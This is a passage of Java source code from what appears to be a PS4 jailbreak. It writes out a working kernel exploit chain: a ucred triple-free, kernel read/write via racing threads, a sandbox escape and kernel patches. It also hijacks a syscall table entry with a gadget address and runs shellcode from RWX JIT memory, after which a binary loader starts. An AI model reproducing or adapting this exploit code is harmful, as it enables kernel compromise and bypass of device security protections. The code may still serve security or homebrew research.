            int syThrcnt = kread32(sysent661Addr + 0x2c);
            kwrite32(sysent661Addr, 2);
            kwrite64(sysent661Addr + 8, kBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
            kwrite32(sysent661Addr + 0x2c, 1);
            
            int PROT_READ = 0x1;
            int PROT_WRITE = 0x2;
            int PROT_EXEC = 0x4;
            int PROT_RW = PROT_READ | PROT_WRITE;
            int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
            
            int alignedMemsz = 0x10000;
            // create shm with exec permission
            long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);
            // create shm alias with write permission
            long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);
            // map shadow mapping and write into it
            Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
            for (int i = 0; i < shellcode.length; i++) {
                api.write8(shadowMappingAddr + i, shellcode[i]);
            }
            // map executable segment
            Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
            Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
            kwrite32(sysent661Addr, syNarg);
            kwrite64(sysent661Addr + 8, syCall);
            kwrite32(sysent661Addr + 0x2c, syThrcnt);
            Helper.syscall(Helper.SYS_CLOSE, writeHandle);
        } catch (Exception e)
        {

        }
        return true;
    }

    public static int main(PrintStream cons) {
        Poops.console = cons;

        // check for jailbreak
        if (Helper.isJailbroken()) {
            NativeInvoke.sendNotificationRequest("Already Jailbroken");
            return 0;
        }

        // perform setup
        console.println("Pre-configuration");
        if (!performSetup())
        {
            console.println("pre-config failure");
            cleanup();
            return -3;
        }
        console.println("Initial triple free");
        if (!triggerUcredTripleFree()) {
            cons.println("triple free failed");
            cleanup();
            return -4;
        }

        // do not print to the console to increase stability here
        if (!achieveRw(KQUEUE_TRIES)) {
            cons.println("Leak / RW failed");
            cleanup();
            return -6;
        }

        console.println("Escaping sandbox");
        if (!escapeSandbox()) {
            cons.println("Escape sandbox failed");
            cleanup();
            return -7;
        }

        console.println("Patching system");
        if (!applyKernelPatchesPS4()) {
            cons.println("Applying patches failed");
            cleanup();
            return -8;
        }

        cleanup();

        BinLoader.start();

        return 0;
    }

    static class IovThread extends Thread {
        private final WorkerState state;
        public IovThread(WorkerState state) {
            this.state = state;
        }
        public void run() {
            cpusetSetAffinity(4);
            Helper.setRealtimePriority(256);
            try {
                while (true) {
                    state.waitForWork();
                    recvmsg(iovSs0, msg, 0);
                    state.signalFinished();
                }
            } catch (InterruptedException e) {
            }
        }
    }

    static class UioThread extends Thread {
        private final WorkerState state;

        public UioThread(WorkerState state) {
        this.state = state;
        }
        public void run() {
            cpusetSetAffinity(4);
            Helper.setRealtimePriority(256);
            try {
                while (true) {
                    int command = state.waitForWork();
                    if (command == COMMAND_UIO_READ) {
                        writev(uioSs1, uioIovRead, UIO_IOV_NUM);
                    } else if (command == COMMAND_UIO_WRITE) {
                        readv(uioSs0, uioIovWrite, UIO_IOV_NUM);
                    }
                    state.signalFinished();
                }
            } catch (InterruptedException e) {
            }
        }
    }

    static class WorkerState {
        private final int totalWorkers;

        private int workersStartedWork = 0;
        private int workersFinishedWork = 0;

        private int workCommand = -1;

        public WorkerState(int totalWorkers) {
            this.totalWorkers = totalWorkers;
        }

        public synchronized void signalWork(int command) {
            workersStartedWork = 0;
            workersFinishedWork = 0;
            workCommand = command;
            notifyAll();

            while (workersStartedWork < totalWorkers) {
                try {
                    wait();
                } catch (InterruptedException e) {
                    // Ignore.
                }
            }
        }

        public synchronized void waitForFinished() {
            while (workersFinishedWork < totalWorkers) {
                try {
                    wait();
                } catch (InterruptedException e) {
                    // Ignore.
                }
            }

            workCommand = -1;
        }

        public synchronized int waitForWork() throws InterruptedException {
            while (workCommand == -1 || workersFinishedWork != 0) {
                wait();
            }

            workersStartedWork++;
            if (workersStartedWork == totalWorkers) {
                notifyAll();
            }

            return workCommand;
        }

        public synchronized void signalFinished() {
            workersFinishedWork++;
            if (workersFinishedWork == totalWorkers) {
                notifyAll();
            }
        }
    }
}
